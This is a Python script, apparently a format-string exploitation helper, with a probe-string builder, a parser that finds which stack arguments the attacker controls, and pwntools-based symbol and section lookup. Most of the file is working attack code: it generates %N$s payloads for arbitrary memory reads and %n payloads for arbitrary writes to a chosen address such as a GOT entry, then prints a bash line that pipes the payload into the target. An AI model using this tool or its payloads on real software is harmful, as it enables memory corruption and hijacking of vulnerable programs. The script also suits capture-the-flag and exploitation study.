#!/usr/bin/env python

from prettytable import PrettyTable
import string
import binascii
import struct
import sys

try:
    import pwnlib
except:
    pwntools = None

binary_pwn = None

def isPrintable(s):
    return min(map(lambda x: x in string.printable,s))

def buildTestString(length=10):
    """
    Test string to help define what you control
    """
    #if length >= 100:
    #    print("Can't do 100 or more length test string. Pattern won't work.")
    #    exit(1)
    
    s = "AAAABBBBCCCCDDDD"
    for x in range(1,length+1):
        s += r"%08x"
    
    print(s)

def parseTestString(s):
    """
    Take output of buildTestString completion
    Determines index and information
    """
    #hexlify("1:%x"[::-1])
    
    def checkForSymbol(addr):
        """
        Check for symbol information on addr.
        Wrapped this so I can add better checks for angr/pwntools
        """
        symbol = None
        if binary_pwn:
            symbol = [sym for sym in binary_pwn.symbols if binary_pwn.symbols[sym] == addr]
            if symbol == []:
                symbol = None
            else:
                symbol = symbol.pop()
        return symbol
    
    def checkForSection(addr):
        """
        Determine what section the symbol is in
        """
        if binary_pwn:
            for sec in binary_pwn.sections:
                if addr in xrange(sec.header.sh_addr,sec.header.sh_addr+sec.header.sh_size):
                    return sec.name
        return ""
    
    def getSectionPerms(section_name):
        """
        Return a dict of permissions for section. Parse section flags.
        """
        if binary_pwn:
            section = binary_pwn.get_section_by_name(section_name)
            section_perms = {}
            flags = section.header.sh_flags
            section_perms['executable'] = True if bool((flags & (2**0)) >> 0) else False
            section_perms['writable'] = True if bool((flags & (2**1)) >> 1) else False
            section_perms['readable'] = True if bool((flags & (2**2)) >> 2) else False
            return section_perms 
    
    # Split out the values
    l = [s[x:x+8] for x in range(0,len(s),8)]
    
    # Sanity check
    assert l[0] == "AAAABBBB"
    assert l[1] == "CCCCDDDD"
    l = l[2:]

    args = {}

    for i in xrange(len(l)):
        if l[i] == "41414141":
            control = 1
        elif l[i] == "42424242":
            control = 2
        elif l[i] == "43434343":
            control = 3
        elif l[i] == "44444444":
            control = 4
        else:
            control = None
        
        extra = []
        
        if isPrintable(binascii.unhexlify(l[i])):
            extra.append(binascii.unhexlify(l[i]))
        
        symbol = checkForSymbol(int(l[i],16))
        
        # Check if this is a known symbol
        if symbol != None:
            extra.append(symbol)
        
        # TODO: Move this around so I only check this if it's in the got or plt section!
        # Check plt
        #if int(l[i],16) in binary_angr.loader.main_bin.reverse_plt:
        #    extra.append("plt." + binary_angr.loader.main_bin.reverse_plt[int(l[i],16)])
        
        # Check for what section this is in
        section_name = checkForSection(int(l[i],16))
        
        # We might not always get a name back. Check that we did
        if len(section_name) > 0:
            perms = getSectionPerms(section_name)
            section_perms = ""
            section_perms += "R" if perms['readable'] else ""
            section_perms += "W" if perms['writable'] else ""
            section_perms += "X" if perms['executable'] else ""
        else:
            section_name = ""
            section_perms = ""
        
        args[i] = {
            "value": int(l[i],16),
            "control": control,
            "extra": ', '.join(extra),
            "section_name": section_name,
            "section_perms": section_perms
        }
    
    return args

def printArgs(info):
    """
    Print out known things about this format string
    buildTestString -> parseTestString -> here
    """
    t = PrettyTable(["Arg","Value","Control","Extra","Section","Perms"])
    for i in range(len(args)):
        t.add_row([i,hex(args[i]["value"]),args[i]["control"],args[i]["extra"],args[i]["section_name"],args[i]["section_perms"]])
    
    print("") 
    print(t)

def locateControl(control,args):
    """
    Locate control (1,2,3,4) inside args
    Return which argument this control is in
    Adding 1 in here since that's the correct location
    """
    return [x for x in args if args[x]["control"] == control].pop() + 1

def buildRead(readAddr,args):
    """
    Building block to read something
    str aType == Type of read to do (i.e.: "s","c","08x", etc)
    args = args information from parseTestString
    """

    #TODO: This assumes which control we're using
    control = locateControl(1,args)
    
    assert type(readAddr) == int
    
    # TODO: Check binary architecture here to ensure correct packing
    readAddr = struct.pack("<I",readAddr)
    
    # TODO: Assuming we can use index here. Maybe give option to expand and not use indexing
    s = readAddr + "%{0}$s".format(control)
    
    return s
    

def buildWrite(writeAddr,writeWhat,args):
    """
    Building block to write something somewhere
    int writeAddr == Target address to write (such as got entry)
    int writeWhat == What to write into target address
    args = args information from parseTestString
    """
    # TODO: Some prints don't handle %5$x type format
    # TODO: Maybe add option to not use %20c type format as well
    # TODO: Add type checking for arguments here
   
    # Since it can get confusing, I'm adding a count
    count = 0

    # Find our control value 
    # TODO: This assumes which control we're using.
    control = locateControl(1,args)
    
    assert type(writeAddr) == int
    assert type(writeWhat) == int
    
    # Convert writeAddr to hex
    # TODO: Check binary architecture here to ensure correct packing
    writeAddr = struct.pack("<I",writeAddr)
    
    # Start up the script
    s = writeAddr
    count += len(writeAddr)
    
    # Since there are problems using something like "%6$n" (not sure why)
    # Utilizing arguments to move this manually
    # Saving 1 %c to pad before we write
    s += "%c"*(control-2)
    count += (control - 2)

    # Clear the input number if our writeWhat is really small (i.e.:<4)
    #if writeWhat < len(s):
    #    s += "%{0}$n".format(control)
    #    count = 0
    
    # TODO: Need to add h support here as addresses basically won't ever finish
    # Write the amount that we need to 
    diff = writeWhat - count
    
    # If we're already at our count, no need to try to add more characters
    if diff != 0:
        s += "%{0}c".format(diff)
        count += diff
    
    if diff < 0:
        print("Not sure what to do here. We've already written too much...")
        exit(1)
    
    # Time to write it
    s += "%n".format(control)
    
    return s

def banner():
    print("""
  __                           _         _        _                               _       _ _            
 / _|                         | |       | |      (_)                             | |     (_) |           
| |_ ___  _ __ _ __ ___   __ _| |_   ___| |_ _ __ _ _ __   __ _    _____  ___ __ | | ___  _| |_ ___ _ __ 
|  _/ _ \| '__| '_ ` _ \ / _` | __| / __| __| '__| | '_ \ / _` |  / _ \ \/ / '_ \| |/ _ \| | __/ _ \ '__|
| || (_) | |  | | | | | | (_| | |_  \__ \ |_| |  | | | | | (_| | |  __/>  <| |_) | | (_) | | ||  __/ |   
|_| \___/|_|  |_| |_| |_|\__,_|\__| |___/\__|_|  |_|_| |_|\__, |  \___/_/\_\ .__/|_|\___/|_|\__\___|_|   
                                                           __/ |           | |                           
                                                          |___/            |_|                           
""")

def parseNumber(x):
    """
    Take in string as hex or integer. Adjust accordingly.
    """
    try:
        # Try base10 first
        return int(x,10)
    except:
        # Try hex
        return int(x,16)
    # Yes, it will crash out if it is neither

def promptWrite():
    """
    Run through user prompts for arbitrary write.
    Returns the format string
    """
    sys.stdout.write("\nEnter address to overwrite (i.e.: 0x12345678 or 427512645)\n-->\t")
    
    writeAddr = parseNumber(raw_input())
    
    sys.stdout.write("\nEnter value to write to this address (int or hex)\n-->\t")
    
    writeWhat = parseNumber(raw_input())
     
    s = buildWrite(writeAddr,writeWhat,args)

    return s

def promptRead():
    """
    Run through user prompts for arbitrary read.
    Returns the format string
    """
    sys.stdout.write("\nEnter address to read (i.e.: 0x12345678 or 427512645)\n-->\t")
    
    readAddr = parseNumber(raw_input())
    
    s = buildRead(readAddr,args)
    
    return s

def menuSelect():
    """
    Select action
    """
    
    print("\nWhat to do?")
    print("-----------")
    print("  1) Arbitrary Write")
    print("  2) Arbitrary Read")
    
    return int(raw_input("\nSelect Action: "),10)
    

def loadBin(b):
    """
    Load up the binary to be more helpful
    Will attempt to load binary in pwntools to get more info
    """
    
    # Check for pwnlib importing correctly
    if not pwnlib:
        print("WARNING: Couldn't import pwnlib. (hint: pip install pwntools)")
        return
    
    # Load the binary
    global binary_pwn
    try:
        binary_pwn = pwnlib.elf.ELF(b)
    except Exception as e:
        print("WARNING: pwntools couldn't load the file.\n\t{0}\n".format(str(e)))


if __name__ == "__main__":
    banner()

    if len(sys.argv) == 2:
        print("Loading: {0}".format(sys.argv[1]))
        loadBin(sys.argv[1])
    
    length = raw_input("\nTest string length? (default = 10) ")
    if length != "":
        length = int(length)
    else:
        length = 10
    
    sys.stdout.write("\nCopy the following into your format string vulnerable application. The purpose is to automatically determine things about your vulnerability.\n-->\t")
    buildTestString(length)

    sys.stdout.write("\nCopy and paste the output back in here:\n-->\t")
    args = parseTestString(raw_input())

    # Ensure we have known control points    
    numControl = len([x for x in args if args[x]["control"] != None])
    
    printArgs(args)
    
    if numControl > 0:
        print("\nI've discovered {0} known control points.".format(numControl))
    
    else:
        print("\nNo control points discovered... Maybe try a higher length. Exiting")
        exit(1)
    
    # Select action
    action = menuSelect()
    
    if action == 1:
        s = promptWrite()
    
    elif action == 2:
        s = promptRead() 
    
    else:
        print("Invalid input. Exiting.")
        exit(1)

    sys.stdout.write("\nHere's your format string line:\n-->\t")
    print(repr(s))
    
    sys.stdout.write("\nExample from bash:\n-->\t$ echo -e {0} | ./formatStringTest\n\n".format(repr(s)))
